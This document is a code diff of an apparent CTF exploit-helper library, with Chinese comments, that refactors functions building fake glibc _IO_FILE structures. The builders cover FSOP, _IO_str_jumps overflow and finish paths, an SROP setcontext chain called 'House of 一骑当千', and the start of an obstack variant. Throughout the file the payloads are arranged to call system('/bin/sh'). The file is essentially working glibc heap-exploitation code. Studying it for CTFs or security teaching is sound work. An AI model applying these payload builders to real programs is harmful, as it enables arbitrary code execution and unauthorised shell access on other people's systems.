@@ -13,26 +13,26 @@ def FSOP(payload_addr, fun, param_value = BINSH, chain = 0):
         param_value: 要调用函数的参数为payload_addr, param_value为函数的参数指针所指向的地址的值
         chain: 下一个链的地址(可选)
     '''
-    payload = b''
-    payload = set_value(payload, 0xC0, 0);            # 设置fake_IO_FILE->_mode=0
-    payload = set_value(payload, 0x28, 1);            # 设置fake_IO_FILE->_IO_write_ptr=1
-    payload = set_value(payload, 0x20, 0);            # 设置fake_IO_FILE->_IO_write_base=0
-    
-    payload = set_value(payload, 0xD8, payload_addr); # 设置fake_IO_FILE->vtable=fake_vtable
-    payload = set_value(payload, 0, param_value);     # 修改fake_IO_FILE头为/bin/sh值
-    payload = set_value(payload, 0x18, fun);          # 设置fake_vtable->__overflow=system，0x18表示__overflow相对于fake_vtable的偏移
-    
-    payload = set_value(payload, 0x68, chain);        # 修改fake_IO_FILE的chain
-    
+    payload =  flat({
+        0x00: param_value,          # fake_IO_FILE->flags = /bin/sh
+        0xC0: 0,                    # fake_IO_FILE->_mode = 0
+        0x20: 0,                    # fake_IO_FILE->_IO_write_base = 0
+        0x28: 1,                    # fake_IO_FILE->_IO_write_ptr = 1
+        0xD8: payload_addr,         # fake_IO_FILE->vtable = fake_vtable
+        0x68: chain,                # fake_IO_FILE->chain = chain
+        
+        0x18: fun,                  # fake_vtable->__overflow = fun
+    }, filler = b'\x00')
     return payload
+    
 
 # 使用overflow触发
-def IOoverflow(_IO_str_jumps_addr, fun_addr, param = None, payload_addr = None):
+def IOoverflow(_IO_str_jumps_addr, fun_addr, payload_addr = None, param = None):
     '''
         _IO_str_jumps_addr: _IO_str_jumps地址
         fun_addr: 函数地址
-        param: 函数参数, 若param为None, 则使用payload_addr内置/bin/sh
         payload_addr: 内置/bin/sh地址, 只有在param为None时有效
+        param: 函数参数, 若param为None, 则使用payload_addr内置/bin/sh
     '''
     if (param is None and payload_addr is None):
         raise ValueError("必须设置 param 或 payload_addr 参数")
@@ -42,21 +42,21 @@ def IOoverflow(_IO_str_jumps_addr, fun_addr, param = None, payload_addr = None):
         param = payload_addr + 0x30
         pass
     
-    payload = b''
-    payload = set_value(payload, 0x0, 0)                            # fake_IO_FILE->_flags = 0
-    payload = set_value(payload, 0x20, 0)                           # fake_IO_FILE->_IO_write_base = 0
-    payload = set_value(payload, 0x28, int((param - 100) / 2 + 1))  # fake_IO_FILE->_IO_write_ptr = (binsh地址 - 100) / 2 + 1
-    payload = set_value(payload, 0x30, BINSH)                       # 内置/bin/sh
-    payload = set_value(payload, 0x38, 0)                           # fake_IO_FILE->_IO_buf_base = 0
-    payload = set_value(payload, 0x40, int((param - 100) / 2))      # fake_IO_FILE->_IO_buf_end = (binsh地址 - 100) / 2
-    payload = set_value(payload, 0xC0, 0)                           # fake_IO_FILE->_mode = 0
-    payload = set_value(payload, 0xD8, _IO_str_jumps_addr)          # fake_IO_FILE->vtable = &_IO_str_jumps
-    payload = set_value(payload, 0xE0, fun_addr)                    # fake_IO_FILE + 0xE0 = &system
-    
+    payload = flat({
+        0x00: 0,                            # fake_IO_FILE->_flags = 0
+        0x20: 0,                            # fake_IO_FILE->_IO_write_base = 0
+        0x28: int((param - 100) / 2 + 1),   # fake_IO_FILE->_IO_write_ptr = (binsh地址 - 100) / 2 + 1
+        0x30: BINSH,                        # 内置/bin/sh
+        0x38: 0,                            # fake_IO_FILE->_IO_buf_base = 0
+        0x40: int((param - 100) / 2),       # fake_IO_FILE->_IO_buf_end = (binsh地址 - 100) / 2
+        0xC0: 0,                            # fake_IO_FILE->_mode = 0
+        0xD8: _IO_str_jumps_addr,           # fake_IO_FILE->vtable = &_IO_str_jumps
+        0xE0: fun_addr,                     # fake_IO_FILE + 0xE0 = &system
+    }, filler = b'\x00')
     return payload
 
 # 使用IOfinish触发
-def IOfinish(_IO_str_jumps_addr, fun_addr, param = None, payload_addr = None):
+def IOfinish(_IO_str_jumps_addr, fun_addr, payload_addr = None, param = None):
     '''
         _IO_str_jumps_addr: _IO_str_jumps地址
         fun_addr: 函数地址
@@ -71,38 +71,64 @@ def IOfinish(_IO_str_jumps_addr, fun_addr, param = None, payload_addr = None):
         param = payload_addr + 0x30
         pass
     
-    payload = b''
-    payload = set_value(payload, 0x0, 0);                           # fake_IO_FILE->_flags = 0
-    payload = set_value(payload, 0x20, 0);                          # fake_IO_FILE->_IO_write_base = 0
-    payload = set_value(payload, 0x28, 1);                          # fake_IO_FILE->_IO_write_ptr = 1
-    payload = set_value(payload, 0x30, BINSH)                       # 内置/bin/sh
-    payload = set_value(payload, 0x38, param);                      # fake_IO_FILE->_IO_buf_base = /bin/sh地址
-    payload = set_value(payload, 0xC0, 0);                          # fake_IO_FILE->_mode = 0
-    payload = set_value(payload, 0xD8, _IO_str_jumps_addr - 0x8);   # fake_IO_FILE + 0xD8 = &(_IO_str_jumps-0x8)
-    payload = set_value(payload, 0xE8, fun_addr);                   # fake_IO_FILE + 0xE8 = system
+    payload = flat({
+        0x00: 0,                            # fake_IO_FILE->_flags = 0
+        0x20: 0,                            # fake_IO_FILE->_IO_write_base = 0
+        0x28: 1,                            # fake_IO_FILE->_IO_write_ptr = 1
+        0x30: BINSH,                        # 内置/bin/sh
+        0x38: param,                        # fake_IO_FILE->_IO_buf_base = /bin/sh地址
+        0xC0: 0,                            # fake_IO_FILE->_mode = 0
+        0xD8: _IO_str_jumps_addr - 0x8,     # fake_IO_FILE + 0xD8 = &(_IO_str_jumps-0x8)
+        0xE8: fun_addr,                     # fake_IO_FILE + 0xE8 = system
+    }, filler = b'\x00')
     
     return payload
 
-def HOYJDQ(payload_addr, read_addr, rop, gadget_addr, ret_addr):
+def HOYJDQ(read_addr, ret_gadget, rsp, rbp, rdi, rsi, rdx, r8, r9):
     '''
         House of 一骑当千 : 触发srop
         
-        payload_addr: payload将要写入的地址
         read_addr: 一个可写的地址即可
-        rop: ROP链
-        gadget_addr: 控制rsp跳过两个gadget(pop xxx;pop xxx; ret)(add rsp, 0x10;ret;)
-        ret_addr: ret gadget
+        ret_gadget: ret gadget
         
         使用方法, 直接触发setcontext, rdi指向payload地址即可
     '''
-    payload = rop.ljust(0xe0, b'\x00')
-    
-    payload = payload[:0xa0-0x8] + p64(gadget_addr) + p64(payload_addr) + p64(ret_addr) + payload[0xa0-0x8:]
-    payload = payload[:0xe0-0x8] + p64(gadget_addr) + p64(read_addr) + p64(0) + payload[0xe0-0x8:]
-    # if len(payload) > 0x1c0:
-    #     payload = payload[:0x1c0-0x8] + p64(gadget_addr) + p64(0) + p64(0) + payload[0x1c0-0x8:]
-    payload = payload[:0x1c0-0x8] + p64(gadget_addr) + p64(0) + p64(0) + payload[0x1c0-0x8:]
+    payload = flat({
+        0xE0: read_addr,    # 这里写入一个可读的地址
+        0x1C0: 0x0,         # 这里写入0
+        # 设置rcx
+        0xA8: ret_gadget,   # ret gadget
+        # SROP
+        0xA0: rsp,
+        0x78: rbp,
+        0x68: rdi,
+        0x70: rsi,
+        0x88: rdx,
+        0x28: r8,
+        0x30: r9,
+        }, filler = b'\x00')
     return payload
+
+# def HOYJDQ(payload_addr, read_addr, rop, gadget_addr, ret_addr):
+#     '''
+#         House of 一骑当千 : 触发srop
+        
+#         payload_addr: payload将要写入的地址
+#         read_addr: 一个可写的地址即可
+#         rop: ROP链
+#         gadget_addr: 控制rsp跳过两个gadget(pop xxx;pop xxx; ret)(add rsp, 0x10;ret;)
+#         ret_addr: ret gadget
+        
+#         使用方法, 直接触发setcontext, rdi指向payload地址即可
+#     '''
+#     payload = rop.ljust(0xe0, b'\x00')
+    
+#     payload = payload[:0xa0-0x8] + p64(gadget_addr) + p64(payload_addr) + p64(ret_addr) + payload[0xa0-0x8:]
+#     payload = payload[:0xe0-0x8] + p64(gadget_addr) + p64(read_addr) + p64(0) + payload[0xe0-0x8:]
+#     # if len(payload) > 0x1c0:
+#     #     payload = payload[:0x1c0-0x8] + p64(gadget_addr) + p64(0) + p64(0) + payload[0x1c0-0x8:]
+#     payload = payload[:0x1c0-0x8] + p64(gadget_addr) + p64(0) + p64(0) + payload[0x1c0-0x8:]
+#     return payload
 
 def HOQSPP(_IO_obstack_jumps_addr, payload_addr,  fun_addr, param = None):
     '''
